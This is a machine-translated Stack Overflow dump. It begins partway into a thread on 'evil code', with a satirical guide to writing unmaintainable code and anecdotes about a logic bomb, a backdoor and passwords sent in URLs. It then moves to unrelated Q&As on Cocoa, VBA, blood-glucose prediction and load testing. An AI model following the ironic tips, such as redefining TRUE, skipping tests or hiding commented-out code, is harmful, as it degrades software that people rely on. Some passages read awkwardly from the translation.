}; 
```

**扩展的 ASCII**

扩展的 ASCII 字符作为变量名完全有效，包括 ß、Ð 和 ñ 字符。如果不在简单的文本编辑器中复制/粘贴，它们几乎是不可能输入的。

**其他语言的名字**

使用外语词典作为变量名的来源。例如，使用德国 punkt 表示点。维护编码员，无需您对德语的牢牢掌握，将享受破译含义的多元文化体验。

**数学中的名字**

选择伪装成数学运算符的变量名称，例如：

```
openParen = (slash + asterix) / equals; 
```

**伪装成注释的代码，反之亦然**

包括被注释掉但乍一看似乎没有注释的代码部分。

```
for(j=0; j<array_len; j+ =8)
{ 
total += array[j+0 ]; 
total += array[j+1 ]; 
total += array[j+2 ]; /* Main body of 
total += array[j+3];   * loop is unrolled 
total += array[j+4];   * for greater speed. 
total += array[j+5];   */ 
total += array[j+6 ]; 
total += array[j+7 ]; 
} 
```

如果没有颜色编码，你会注意到三行代码被注释掉了吗？

**伪装成关键字的任意名称**

记录时，您需要一个任意名称来表示文件名，请使用“文件”。切勿使用明显任意的名称，例如“Charlie.dat”或“Frodo.txt”。通常，在您的示例中，使用听起来尽可能像保留关键字的任意名称。例如，参数或变量的好名称是“bank”、“blank”、“class”、“const”、“constant”、“input”、“key”、“keyword”、“kind”、“output” 、“参数”、“参数”、“系统”、“类型”、“值”、“变量”和“变量”。如果您对任意名称使用实际的保留字，这将被您的命令处理器或编译器拒绝，那就更好了。如果你做得好，

**代码名称不得与屏幕名称匹配**

选择您的变量名称，使其与在屏幕上显示此类变量时使用的标签完全无关。例如，在屏幕标签字段“邮政编码”，但在代码中调用相关变量“zip”。

**选择最佳重载运算符**

在 C++ 中，重载 +、-、*、/ 来做与加法、减法等完全无关的事情。毕竟，如果 Stroustroup 可以使用移位运算符进行 I/O，为什么你不应该同样有创意呢？如果你重载 +，请确保你以 i = i + 5; 与 i += 5 的含义完全不同；这是一个将重载运算符混淆提升为高级艺术的示例。重载“！” 类的运算符，但重载与反转或否定无关。让它返回一个整数。然后，为了得到它的逻辑值，你必须使用'！！'。然而，这颠倒了逻辑，所以 [drum roll] 你必须使用 '! ！！'。不要混淆！运算符，它返回一个布尔值 0 或 1，带有 ~ 位逻辑否定运算符。

**例外**

我将让你了解一个鲜为人知的编码秘密。例外是背后的痛苦。正确编写的代码永远不会失败，因此异常实际上是不必要的。不要在他们身上浪费时间。子类化异常适用于那些知道他们的代码会失败的不称职的人。您可以通过在调用 System.exit() 的整个应用程序（在 main 中）中只有一个 try/catch 来大大简化您的程序。只需在每个方法标头上粘贴一组完全标准的抛出，无论它们实际上是否可以抛出任何异常。

**魔法矩阵位置**

在某些矩阵位置使用特殊值作为标志。一个不错的选择是与齐次坐标系一起使用的变换矩阵中的 [3][0] 元素。

**重新审视魔法阵列插槽**

如果您需要给定类型的多个变量，只需定义它们的数组，然后按数字访问它们。选择一个只有您知道且不记录的编号约定。并且不要费心为索引定义#define 常量。每个人都应该知道全局变量 widget[15] 是取消按钮。这只是在汇编代码中使用绝对数字地址的最新变体。

**从不美化**

永远不要使用自动源代码整理器（美化器）来保持代码对齐。游说让他们禁止他们进入您的公司，理由是他们在 PVCS/CVS（版本控制跟踪）中创建了虚假的增量，或者每个程序员都应该拥有自己的缩进风格，对他编写的任何模块都永远神圣不可侵犯。坚持让其他程序员在“他的”模块中遵守那些特殊的约定。禁止美化器非常容易，尽管它们节省了数百万次手动对齐的击键，并且浪费了数天时间来误解对齐不佳的代码。只要坚持每个人都使用相同的整理格式，不仅用于存储在公共存储库中，而且在他们编辑时也是如此。这将启动 RWAR，而老板为了维持和平，将禁止自动整理。没有自动整理，您现在可以随意地意外错位代码，从而产生一种视觉错觉，即循环体和 if 比实际更长或更短，或者 else 子句匹配与实际不同的 if。例如

```
if(a)
  if(b) x=y;
else x=z; 
```

**测试是给懦夫的**

勇敢的程序员会绕过这一步。太多的程序员害怕他们的老板，害怕失去工作，害怕客户讨厌的邮件，害怕被起诉。这种恐惧使行动瘫痪，并降低了生产力。研究表明，取消测试阶段意味着管理人员可以提前设定发货日期，这对计划过程有明显的帮助。恐惧消失了，创新和实验才能开花结果。程序员的角色是生成代码，调试可以通过帮助台和遗留维护组的合作来完成。

如果我们对自己的编码能力充满信心，那么测试将是不必要的。如果我们从逻辑上看，那么任何傻瓜都可以认识到测试甚至不是试图解决技术问题，而是情绪信心的问题。解决这种缺乏信心问题的更有效的解决方案是完全消除测试并将我们的程序员送到自尊课程。毕竟，如果我们选择做测试，那么我们必须测试每一个程序更改，但我们只需要让程序员参加一门关于建立自尊的课程。成本效益是显而易见的。

**颠倒通常的真假约定**

颠倒通常的真假定义。听起来很明显，但效果很好。您可以隐藏：

```
#define TRUE 0 
#define FALSE 1 
```

代码深处的某个地方，以便从程序的内部从某个没人再看的文件中挖掘出来。然后强制程序进行如下比较：

```
if ( var == TRUE )
if ( var != FALSE ) 
```

有人一定会“纠正”明显的冗余，并以通常的方式在其他地方使用 var ：

```
if ( var ) 
```

另一种技术是使 TRUE 和 FALSE 具有相同的值，尽管大多数人会认为这是彻头彻尾的作弊。使用值 1 和 2 或 -1 和 0 是一种更微妙的方式，可以让人们绊倒并仍然看起来很受人尊敬。您可以通过定义一个名为 TRUE 的静态常量在 Java 中使用相同的技术。程序员可能会更加怀疑你做的不好，因为 Java 中有一个内置的字面量 true。

**利用精神分裂症**

Java 对数组声明感到精神分裂。您可以使用旧的 C 方式 String x[]（使用混合的前置后缀表示法）或新的方式 String[] x 使用纯前缀表示法。如果您真的想迷惑人们，请混合使用符号se.g。

```
byte[ ] rowvector, colvector , matrix[ ]; 
```

这相当于：

```
byte[ ] rowvector; 
byte[ ] colvector; 
byte[ ][] matrix; 
```

* * *

## 回答 #9

> 赞同：18
> 
> 时间：2009-01-12T04:18:38.443

我不知道我是否会将代码称为“邪恶”，但我们有一个开发人员会创建`Object[]`数组而不是编写类。到处。

* * *

## 回答 #10

> 赞同：18
> 
> 时间：2009-01-12T04:41:57.803

我已经看到（并发布到 thedailywtf）代码，该代码将让每个人在星期二对应用程序的重要部分拥有管理员权限。我猜原始开发人员在本地机器测试后忘记删除代码。

* * *

## 回答 #11

> 赞同：16
> 
> 时间：2009-02-19T01:59:51.600

我不知道这是否是“邪恶”，甚至是被误导了（我最近将其发布在旧新事物上）：

我认识一个喜欢将信息存储为分隔字符串的人。他熟悉数组的概念，如他使用分隔字符串数组时所示，但灯泡从未点亮。

* * *

## 回答 #12

> 赞同：14
> 
> 时间：2009-05-02T06:14:17.800

Base 36 编码以将整数存储在字符串中。

我猜这个理论有点类似于：

*   十六进制用于表示数字
*   十六进制不使用F以外的字母，表示GZ被浪费了
*   浪费是坏事

目前，我正在使用一个数据库，该数据库将事件可能发生的星期几存储为 7 位位域 (0-127)，存储在数据库中作为 2 字符字符串，范围为“0”到“3J”。

* * *

## 回答 #13

> 赞同：13
> 
> 时间：2009-02-19T02:29:44.837

我记得看到一个登录处理程序接受一个发布请求，并使用作为参数传入的用户名和密码重定向到 GET。这是针对“企业级”医疗系统的。

我在检查一些日志时注意到了这一点——我很想向 CEO 发送他的密码。

* * *

## 回答 #14

> 赞同：12
> 
> 时间：2009-01-12T07:08:11.097

真正邪恶的是这段出色的德尔福代码：

```
type
  TMyClass = class
  private
    FField : Integer;
  public
    procedure DoSomething;
  end;

var
  myclass : TMyClass;

procedure TMyClass.DoSomething;
begin
  myclass.FField := xxx; // 
end; 
```

如果一个类只有一个实例，它会很好用。但不幸的是，我不得不使用另一个实例，这产生了很多有趣的错误。

当我找到这颗宝石时，我不记得我是昏倒还是尖叫，可能两者兼而有之。

* * *

## 回答 #15

> 赞同：12
> 
> 时间：2010-04-10T09:56:53.547

也许不是邪恶的，但肯定是，嗯……被误导了。

我曾经不得不重写一个“自然语言解析器”，它被实现为一个 5,000 行的 if...then 语句。

如...

```
if (text == "hello" || text == "hi")
    response = "hello";
else if (text == "goodbye")
    response = "bye";
else
    ... 
```

* * *

## 回答 #16

> 赞同：11
> 
> 时间：2009-05-29T20:06:31.053

我在一个 ASP.NET MVC 站点中看到了一个以前只做过 Web 表单（并且是著名的复制/粘贴者！）的人的代码，该代码将客户端单击事件粘贴在一个`<a>`调用执行文档的 javascript 方法的标记上。地点。

我试图解释标签`href`上的a 会做同样的事情！`<a>`

* * *

## 回答 #17

> 赞同：10
> 
> 时间：2010-06-09T20:13:10.940

有点邪恶……我认识的一个人在公司内部的主要网络应用程序中写了一封信，每天检查他是否在过去 10 天内登录过系统。如果没有他登录的记录，它将为公司中的每个人禁用该应用程序。

他一听到裁员的传言就写了这篇文章，如果他倒下了，公司将不得不遭受损失。

我知道这件事的唯一原因是他休了两个星期的假，当网站崩溃时我打电话给他。他告诉我用他的用户名/密码登录……一切又好了。

当然……几个月后，我们都被解雇了。

* * *

## 回答 #18

> 赞同：8
> 
> 时间：2009-01-12T07:04:30.900

我的同事喜欢回忆起使用`public static`数据库连接进行所有数据库工作的 ASP.NET 应用程序。

是的，所有请求的一个连接。不，也没有锁定。

* * *

## 回答 #19

> 赞同：5
> 
> 时间：2009-01-12T06:43:27.463

我记得必须设置 IIS 3 才能运行 Perl CGI 脚本（是的，那是很久以前的事了）。当时官方的推荐是把 Perl.exe 放到 cgi-bin 中。它有效，但它也让**每个人都**可以访问一个非常强大的脚本引擎！

* * *

## 回答 #20

> 赞同：5
> 
> 时间：2009-05-29T17:42:20.737

任何设置[邪恶位的符合](http://en.wikipedia.org/wiki/Evil_bit)[RFC 3514](https://www.rfc-editor.org/rfc/rfc3514)的程序。

* * *

## 回答 #21

> 赞同：5
> 
> 时间：2010-02-04T02:11:18.077

我们有一个应用程序，它在一个 xml 文件中加载了它的所有全局状态。没有问题，除了开发人员创建了一种新的递归形式。

```
<settings>
  <property>
      <name>...</name>
      <value>...</value>
      <property>
          <name>...</name>
          <value>...</value>
          <property>
              <name>...</name>
              <value>...</value>
              <property>
                   <name>...</name>
                   <value>...</value>
                   <property>
                        <name>...</name>
                        <value>...</value>
                       <property>
                             <name>...</name>
                             <value>...</value>
                            <property> 
```

然后是有趣的部分。当应用程序加载时，它会遍历属性列表并将它们添加到全局（平面）列表中，同时增加一个神秘计数器。神秘计数器被命名为完全不相关的东西，用于神秘计算：

```
List properties = new List();
Node<-root
while node.hasNode("property")
    add to properties list
    my_global_variable++;
    if hasNode("property")
         node=getNode("property"), ... etc etc 
```

然后你会得到像

```
calculateSumOfCombinations(int x, int y){
   return x+y+my_global_variable;
} 
```

编辑：澄清-我花了很长时间才弄清楚他在计算递归的深度，因为在第 6 或第 7 级属性改变了含义，所以他使用计数器将他的平面集拆分为 2 组不同类型, 有点像拥有一个 STATE、STATE、STATE、CITY、CITY、CITY 的列表并检查 index > counter 以查看您的名字是城市还是州)

* * *

## 回答 #22

> 赞同：5
> 
> 时间：2010-06-09T18:38:50.150

SQL 查询就在 ASP 应用程序中的 javascript 中。不能再脏了...

* * *

## 回答 #23

> 赞同：4
> 
> 时间：2009-05-29T17:34:43.513

我们的一位“架构师”没有为需要持续运行的服务器进程编写 Windows 服务，而是编写了一个控制台应用程序，并使用任务调度程序每 60 秒运行一次。

请记住，这是在 .NET 中非常容易创建服务的地方。

--

此外，在同一个地方，控制台应用程序用于托管 .NET 远程服务，因此他们必须启动控制台应用程序并锁定会话以使其在每次重新启动服务器时保持运行。

--

在我工作的最后一个地方，其中一位架构师有一个**C** # 源代码文件，其中包含 100 多个类，大小约为 250K。

* * *

## 回答 #24

> 赞同：3
> 
> 时间：2010-02-01T09:11:04.010

32 个源代码文件，每个文件超过 10K 行代码。每个都包含一个类。每个类都包含一个完成“一切”的方法

在我不得不重构之前调试该代码真是一场噩梦。

* * *

## 回答 #25

> 赞同：3
> 
> 时间：2010-03-18T22:34:50.947

在较早的工作场所，我们继承了一个遗留项目，该项目早些时候已部分外包。主要应用程序是 Java，外包部分是本地 C 库。一旦我查看了 C 源文件。我列出了目录的内容。有几个大小超过 200K 的源文件。最大的 C 文件为**600 KB**。

感谢上帝，我从来没有真正接触过它们:-)

* * *

## 回答 #26

> 赞同：3
> 
> 时间：2010-04-11T07:07:37.297

当同事在国外的客户那里（安装所述程序）时，我得到了一组程序来推进。每个程序都出现了一个关键库，并且试图找出代码，我意识到一个程序与下一个程序之间存在微小差异。在一个公共图书馆。

意识到这一点，我对所有副本进行了文本比较。在 16 个中，我认为大约有 9 个独特的。我扔了一个合适的。

老板进行了干预，让同事们整理了一个看似普遍的版本。他们通过电子邮件发送了代码。我不知道，那里有带有不可打印字符的字符串，还有一些混合编码。电子邮件乱码它非常糟糕。

不可打印的字符用于将数据（所有字符串！）从服务器发送到客户端。因此，所有字符串在服务器端由 0x03 字符分隔，并使用 Split 函数在 C# 中重新组装客户端。

somwehat 理智的方法是：

```
someVariable.Split(Convert.ToChar(0x03); 
```

更理智和友好的方法是使用常量：

```
private const char StringSeparator = (char)0x03;
//...
someVariable.Split(StringSeparator); 
```

邪恶的方式是我的同事选择的：在 Visual Studio 中为 0x03 使用任何“打印”并将其放在引号之间：

```
someVariable.Split('/*unprintable character*/'); 
```

此外，在这个库（以及所有相关程序）中，没有一个变量是本地的（我检查过！）。函数的设计目的是在认为可以安全地浪费它们时恢复相同的变量，或者创建在整个过程期间都存在的新变量。我打印了几页并对它们进行了颜色编码。黄色的意思是“全局的，永远不会被另一个函数改变”，红色的意思是“全局的，被几个改变”。格林本来是“本地的”，但没有。

哦，我有提到控制版本吗？因为当然没有。

补充：我只记得不久前我发现的一个功能。

它的目的是遍历一个整数数组，并将每个第一项和最后一项设置为 0。它是这样的（不是实际代码，来自内存，还有更多 C#-esque）：

```
FixAllArrays()
{
    for (int idx = 0; idx < arrays.count- 1; idx++)
    {
        currArray = arrays[idx];
        nextArray = arrays[idx+1];
        SetFirstToZero(currArray);
        SetLastToZero(nextArray);

        //This is where the fun starts
        if (idx == 0)
        {
            SetLastToZero(currArray);
        }

        if (idx == arrays.count- 1)
        {
            SetFirstToZero(nextArray);
        }
    }
} 
```

当然，关键是每个子数组都必须在所有项目上完成这两项操作。我只是不确定程序员如何决定这样的事情。

* * *

## 回答 #27

> 赞同：2
> 
> 时间：2009-01-12T04:17:05.480

在我们的客户团队报告了一些奇怪的问题后，我们注意到应用程序的两个不同版本指向同一个数据库。（在给他们部署新系统的时候，他们的数据库升级了，但是大家都忘了把他们的旧系统关掉）

这是一个奇迹般的逃脱..

从那时起，我们有了一个自动化的构建和部署过程，谢天谢地:-)

* * *

## 回答 #28

> 赞同：2
> 
> 时间：2009-01-12T04:48:04.950

类似于上面其他人提到的：

我在一个应用程序中有伪脚本语言的地方工作。它输入了一个庞大的方法，该方法有大约 30 个参数和一个巨大的`Select Case`语句。

是时候添加更多参数了，但团队中必须这样做的人意识到已经有太多参数了。

他的解决方案？

他在最后添加了一个`object`参数，所以他可以传入任何他想要的东西然后施放它。

我不能足够快地离开那个地方。

* * *

## 回答 #29

> 赞同：2
> 
> 时间：2009-02-19T02:37:50.637

我认为这是一个程序，它将循环加载到 pdp-10 的通用寄存器中，然后执行这些寄存器中的代码。

你可以在 pdp-10 上做到这一点。这并不意味着你应该这样做。

编辑：至少这是我最好的（有时很破旧）的回忆。

* * *

## 回答 #30

> 赞同：2
> 
> 时间：2010-06-13T03:42:31.730

我很不幸在半定制数据库高可用性解决方案中发现了一个相当疯狂的行为。

核心位不起眼。Red Hat Enterprise Linux、MySQL、DRBD 和 Linux-HA 的东西。然而，配置是由一个完全自定义的类似 puppet 的系统维护的（不出所料，这个系统还有许多其他疯狂的例子）。

事实证明，系统正在检查`install.log`Kickstart 保留在根目录中的文件，以获取创建 DRBD 配置所需的部分信息。当然，这本身就是邪恶的。您不会从格式未实际定义的日志文件中提取配置。不过，情况会变得更糟。

它没有将这些数据存储在其他任何地方，并且每次运行时，即每 60 秒，它都会查询`install.log`.

我只是让你猜猜第一次有人决定删除这个原本无用的日志文件时发生了什么。

* * *

## 回答 #31

> 赞同：2
> 
> 时间：2010-12-06T15:50:36.217

在我加入的一个项目中，我发现了这块钻石：

```
newwin=parent.parent.window.opener.parent.parent.parent.frames['clear'].window.open('empty.htm'); 
```

* * *

## 回答 #32

> 赞同：1
> 
> 时间：2010-04-06T17:29:58.753

有人写了一个批处理程序来根据我的计算机上的模具面生成随机数，我想我会分享它。

```
@echo off

set SIDES=6 

:start
set BUF=%random%
if %BUF% GTR %SIDES% (
goto start
)

echo %BUF%
pause

goto start 
```

做这项工作，但猜猜它有多慢......

* * *

## 回答 #33

> 赞同：0
> 
> 时间：2010-04-10T09:28:23.667

我曾使用过印度开发人员编写的类似内容。巨型主窗体，全局变量等。幸运的是，我的老板经过一番努力，大大减少了这个烂摊子。但是，我仍然讨厌使用这个应用程序。不幸的是，它是数学应用程序，其中一些印度人擅长数学，所以我们必须修复应用程序，而不是重写它。

对我来说，最糟糕的部分是 Visual Studio + ReSharper 在 20000 行的表单上速度慢得令人难以置信。如果你关闭 ReSharper，它是可以管理的，但是你不能那么快地重构这个狗屎。

* * *

## 回答 #34

> 赞同：0
> 
> 时间：2010-04-11T06:43:05.263

这是一些邪恶的代码：[http ://code.google.com/p/google-caja/wiki/AttackVectors](http://code.google.com/p/google-caja/wiki/AttackVectors)

* * *

## 回答 #35

> 赞同：0
> 
> 时间：2010-04-11T10:40:21.790

来自我们公司佣金计算应用程序中的 Oracle 软件包（在我从头开始重建之前）

```
CREATE OR REPLACE PACKAGE BODY Const AS
    FUNCTION Basisprov_offen
        RETURN INT
    IS
        BEGIN
            RETURN 4;
        END;

    FUNCTION Basisprov_offen_s
        RETURN VARCHAR
    IS
        BEGIN
            RETURN Const.Basisprov_offen || '';
        END;

/* ... a lot more creepy stuff ... */

END Const; 
```

并且在同一个应用程序的不同包中

```
...
INSERT INTO Texpkorr
    SELECT
        Stammnummer,
        Nummer,
        Artikelnummer,
        GREATEST ( 0, Texp.Kommanditbetrag - NVL ( 0, 0 )) Kommanditbetrag,
        GREATEST ( 0, Texp.Bareinlagebetrag - NVL ( 0, 0 )) Bareinlagebetrag,
        GREATEST ( 0, Texp.Provisionohneagio - NVL ( 0, 0)) Provisionohneagio,
        GREATEST ( 0, Texp.Provisionmitagio - NVL ( 0, 0 )) Provisionmitagio,
        GREATEST ( 0, Texp.Agionachlass - NVL ( 0, 0 )) Agionachlass,
        Exportart
   FROM Provaltbv, Texp
... 
```

* * *

## 回答 #36

> 赞同：0
> 
> 时间：2010-06-09T18:50:51.543

我曾经一起工作的一个人编写了一个 MS Access 应用程序，该应用程序链接到大约 10 个其他访问数据库，这些数据库为一家财富 500 强公司处理工资单。最后检查一下，那里有大约 70,000 名员工，并且仍在使用中……

代码中的错误检查很少，看起来很讨厌，更难排除故障。我们一直在最大化访问数据库，所以我们必须每隔几个月清理一次。

是的，我知道这不是代码段。仅 MS Access、工资单和财富 500 强这三个事实就构成了邪恶。很邪恶。我希望我在开玩笑。

* * *

## 回答 #37

> 赞同：0
> 
> 时间：2011-10-18T17:47:49.993

几年前，我加入了一家多公司的忠诚度奖励公司，这些公司已经投入生产。什么应该是快速评估和了解业务，结果是揭示和领导对一些混乱的关键修复：

*   2 在全国各地的信息亭中的第三方构建应用程序上（它在智能卡和在线余额上运行）：
    *   可能会因为不难获得条件而**失去平衡**
    *   可以被**利用来获得任意数量的免费余额**
*   我什至不知道是谁开发的积分 x 年到期年度流程：
    *   在某些情况下，它**会**错误**地为至少 30% 的用户损失大量余额**……最糟糕的是，在我发现之前，备份过程和任何其他基于事务的恢复跟踪都是蹩脚的

请记住，即使这些是奖励积分，**它也是**您可以花在几乎任何东西上的钱：食物、电影院、航班、药店等等。

# cocoa - 当父级不是窗口时，有没有办法获取相对于最里面的 NSView 的坐标？

> ID：434424
> 
> 赞同：15
> 
> 时间：2009-01-12T04:17:26.633
> 
> 标签：cocoa

我对 NSView 有疑问：

想象一个自定义视图，其中 mouseDown、mouseDrag 和 mouseUp 方法被覆盖，因此用户可以在屏幕上拖动一个点 (NSRect)。要拖动它，我需要相对于当前视图的鼠标坐标。当视图的父级是窗口时这不是问题，但是当视图在另一个视图中时如何获取它们？

```
@implementation MyView

- (id)initWithFrame:(NSRect)frame {
    self = [super initWithFrame:frame];
    if (self) {
        pointXPosition = 200.0f;
        pointYPosition = 200.0f;

        locked = NO;
    }
    return self;
}

- (void) drawRect:(NSRect)rect {

    NSRect point = NSMakeRect(pointXPosition, pointYPosition, 6.0f, 6.0f);
    [[NSColor redColor] set];
    NSRectFill(point);

}

- (void)mouseDown:(NSEvent *)theEvent {
    NSPoint mousePos = [theEvent locationInWindow];
    NSRect frame = [super frame];
    CGFloat deltaX = mousePos.x - frame.origin.x - pointXPosition;
    CGFloat deltaY = mousePos.y - frame.origin.y - pointYPosition;
    if(sqrtf(deltaX * deltaX + deltaY * deltaY) < 100.0f)
        locked = YES;
}

- (void)mouseUp:(NSEvent *)theEvent {
    locked = NO;
}

- (void)mouseDragged:(NSEvent *)theEvent {

    if(locked) {
        NSPoint mousePos = [theEvent locationInWindow];

        NSRect frame = [super frame];

        CGFloat oldXPos = pointXPosition;
        CGFloat oldYPos = pointYPosition;

        pointXPosition = mousePos.x - frame.origin.x;
        pointYPosition = mousePos.y - frame.origin.y;

        CGFloat rectToDisplayXMin = MIN(oldXPos, pointXPosition);
        CGFloat rectToDisplayYMin = MIN(oldYPos, pointYPosition);

        CGFloat rectWidthToDisplay = MAX(oldXPos, pointXPosition) - rectToDisplayXMin;
        CGFloat rectHeigthToDisplay = MAX(oldYPos, pointYPosition) - rectToDisplayYMin;

        NSRect dirtyRect = NSMakeRect(rectToDisplayXMin,
                                      rectToDisplayYMin,
                                      rectWidthToDisplay + 6.0f,
                                      rectHeigthToDisplay + 6.0f);

        [self setNeedsDisplayInRect:dirtyRect];
    }
} 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2009-01-12T05:56:51.113

您无需手动转换为本地坐标系。`convertPoint:fromView:`您可以通过将消息发送到您的视图将点转换为本地坐标系。`nil`作为参数发送到`fromView`将从视图的父窗口（无论在哪里）转换点。您还可以发送任何其他视图以获取从该空间转换的坐标：

```
// convert from the window's coordinate system to the local coordinate system
NSPoint clickPoint = [self convertPoint:[theEvent locationInWindow] fromView:nil];

// convert from some other view's cooridinate system
NSPoint otherPoint = [self convertPoint:somePoint fromView:someSuperview]; 
```

# .net - 从 VBA 代码打开 .NET WPF 窗口或 Windows 窗体

> ID：434432
> 
> 赞同：0
> 
> 时间：2009-01-12T04:25:13.357
> 
> 标签：.net, vba

谁能给我从 VBA 代码调用 .NET 程序集所需的语法。

我想从 Access 表单打开 WPF 窗口或 Windows 表单。

马尔科姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-12T06:02:13.380

是的，我可以控制装配

我希望能够将程序集部署到文件共享并让 VBA 客户端加载它。

我认为最好使用 COM 互操作？？？？

马尔科姆

# algorithm - 预测“血糖”算法？

> ID：434435
> 
> 赞同：9
> 
> 时间：2009-01-12T04:27:50.577
> 
> 标签：algorithm, medical, calculus

我正在编写一个应用程序，让糖尿病用户输入他/她的“血糖”读数，然后在图表上从左到右绘制它们。由于血液读数每天只进行几次，因此算法将很方便：

a) 填补读数之间的图表上的空白（曲线比生涩的线条更真实）并允许更准确的“血糖水平”每日平均值

b) 粗略预测未来会发生什么（如果用户不吃任何会影响他的血液水平的东西）

我很讨厌微积分。我希望这里有人知道这些东西的图书馆？我希望有人知道已经针对此特定问题量身定制的算法（例如：有人将其与糖尿病患者的真实数据进行了比较）

免责声明：我非常清楚任何此类算法都会因用户而异。我只是想改进直角线。无论糖尿病患者如何，血糖上升和下降的速度都是有限度的。

我正在使用 Javascript，但由于它只是数学，我可以从 C、Java 或其他任何东西移植它。

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2009-01-12T04:40:28.787

血糖行为*非常*复杂。它受

*   当前血糖（如果患者血糖过高，可能会出现酮体）
*   最近的食物需要几个小时，具体取决于类型和数量
*   最近的速效胰岛素（45 分钟到 2 小时之间的变化和患者依赖的反应曲线。哦，还有递送机制）
*   超过 12 小时的长效胰岛素（同样取决于患者和品种）
*   活动水平
*   压力水平
*   疾病
*   如果患者佩戴泵，则基础胰岛素率
*   *恶心*

非常难的问题。您选择的任何启发式方法——**任何**启发式方法都将具有高度误导性。这么简短的回答：

> **不要这样做。**

* * *

这部分来自于将糖尿病患者的 24 小时连续血糖记录与同时进行的约 10 次手指刺痛进行了比较。即我的建议是数据驱动的。

* * *

**编辑：**显然我没有说清楚。

> **你甚至无法靠近。**

用手指刺破的数据做的任何事情都不可能是远程可靠的。

用任何线（甚至是直线段）连接点是**完全错误**的。它不反映现实。一点儿都没有。

我是一名实验粒子物理学家。复杂的数据集是我所做的。我的生活中有一个糖尿病患者（你猜到了吗？）。这对我很重要。

但我已经看到了高频数据日志，与手指刺痛、运动、食物和胰岛素的日子日志并排显示。

如果你能得到每十五分钟的数据，我会说继续使用样条曲线。这不会是危险的误导。但是，如果您一天中有 6 到 10 次测量结果，您将*一无所知*。

* * *

好消息：持续监测的价格正在下降。它已经走出实验室，即使现在也可以使用一些泵。

* * *

对于那些不熟悉这一点的人：顺从的糖尿病患者（非常不科学的民意调查的结果）理所当然地每天进行 4-6 次以上的葡萄糖测试，并且在任何意外旅行后的 1-2 小时内再进行几次（他们会出现身体症状，使他们能够发现严重的偏移）。

这可以让患者大致了解他们在控制血糖水平方面的表现，但他们也会去实验室每季度（左右）抽取一次血红蛋白 A1C。A1C 结果主要取决于他们的平均血糖。

我已经和那些连续几个月每天四次打卡在 80-110（非常有利的数字）的人交谈，并得到 A1C 表明平均高于 150（根本不理想）。据推测，他们在夜间走高。我从那些我们可能会睡得很低——非常低——的人那里听到过类似的故事。

教训是：

> 手指点刺读数有其作用，但不要试图将它们外推到采样不充分的时间。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T14:09:03.227

If you want to do just a straight fit of the data to make things easier to view then something like what [Charlie Martin](https://stackoverflow.com/questions/434435/predictive-blood-glucose-algorithm#434444) recommended would likely work well. However, as noted by [dmckee](https://stackoverflow.com/questions/434435/predictive-blood-glucose-algorithm#434454) this data really wouldn't mean anything.

What you are trying to do is actually more in line with [pharmacokenetics](http://en.wikipedia.org/wiki/Pharmacokinetics) which is an entire scientific study in and of itself. In this case I'm not even sure it would entirely apply except in the case of Type I Diabetes as most of what I know about pharamcokenetics only applies drug studies, but if something is being produced by the body then you are likely looking at entirely different types of analysis. If you are interested in the subject then there are quite a few book previews on [Google Books](http://books.google.com/) if you do a search for "[pharmacokienetics](http://books.google.com/books?q=PHARMACOKINETICS&btnG=Search+Books)" but due to the nature of the subject they are very math heavy and assume that you have an understanding of chemistry and biology as well.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T04:33:35.777

好的，您将要寻找一些拟合曲线。与此有关的是，对于 n 个点，有符合要求的多项式...我认为是 n-1。有一阵子了。 [是的。天哪，我是对的。](http://en.wikipedia.org/wiki/Curve_fitting) 当您有很多点并且不想要复杂的函数（您不需要）时，常见的事情是使用[最小二乘近似](http://en.wikipedia.org/wiki/Least_squares)。

可能最好的办法是寻找可以使用的罐装程序；这些存在于大多数统计数据包中。给我们更多关于您想要的环境的详细信息，我们可能会更接近地为您指出合适的环境。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-10-28T04:12:49.537

This is most likely not going to work but Artificial Neural Networks may, and i repeat *may* be able to get something out of a good data set. By good, i mean like weeks or months of continuous recording, and even then i wouldn't trust the data set unless i had *very* good reason to. I also don't think you'll get predictive data out of it, but it may depend on how you implement it. Overall if you were to do this it would seem to be more of a hobby thing to see if it even even come close, like "oh neat i got a neural network to within X amount of accuracy". Again, i must stress, **don't use this in any sort of production situations or anywhere where it could possibly hurt or kill someone!**

# performance - 您用什么来测试（功能/负载/压力）您的网络服务与它的自定义协议？

> ID：434438
> 
> 赞同：5
> 
> 时间：2009-01-12T04:29:54.457
> 
> 标签：performance, testing, networking, network-programming

我最近创建了一个回合制游戏服务器，它可以接受成千上万的同时客户端连接（长话短说 - Linux 上的 epoll）。通信基于一个简单的、自定义的、基于线路的协议。该服务器允许客户端连接、在游戏比赛中寻找其他玩家、玩所述游戏（发送动作、聊天消息等），并在游戏结束时收到通知。

我现在要做的是通过模拟客户端连接来测试服务器。我希望支持成千上万的同时连接，所以这个测试对我来说非常重要。你们自己的测试用什么？

我现在正在研究的一些东西是：pexpect（python 期望 lib 用于功能测试）和 tsung 用于负载测试。

我希望能够从我的笔记本电脑上进行测试，因为我没有可以连接的客户端计算机集群。也许我需要使用 ip aliasing 或类似的东西来生成数千个出站套接字（每个接口 AFAIK 限制为 65K）。

无论如何，在我看来，我需要一些相当定制的东西，但我想在我走这条路之前我会问一下。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T04:47:51.363

在使用自定义协议（基于 Java RMI 的 API）对银行应用程序进行自动回归/负载测试之前，我已经将[JMeter与自定义采样器和断言组件一起使用。](http://jakarta.apache.org/jmeter/)

虽然它并不完全是轻量级的，而且您最终会在 JMeter 组件中进行大量额外的编码以支持您的自定义协议。我猜在这种情况下，您必须编写自己的基于 Java 套接字的客户端。

但它为您定义测试组件的逻辑提供了很大的灵活性，因此您可以在其中做任何您想做的事情。它也可以很好地扩展，并允许您在被测系统上抛出大量并发连接。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-13T19:11:30.357

我决定最好从“自己动手”开始。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T05:44:58.113

我们正在使用 HP LoadRunner，它是最先进的负载测试产品。（但也是一个昂贵的）。它可以模拟对服务器的数千个请求，并提供响应时间等指标。

# c# - 使用 PInvoke .Net 设置应用时区

> ID：434441
> 
> 赞同：1
> 
> 时间：2009-01-12T04:31:41.660
> 
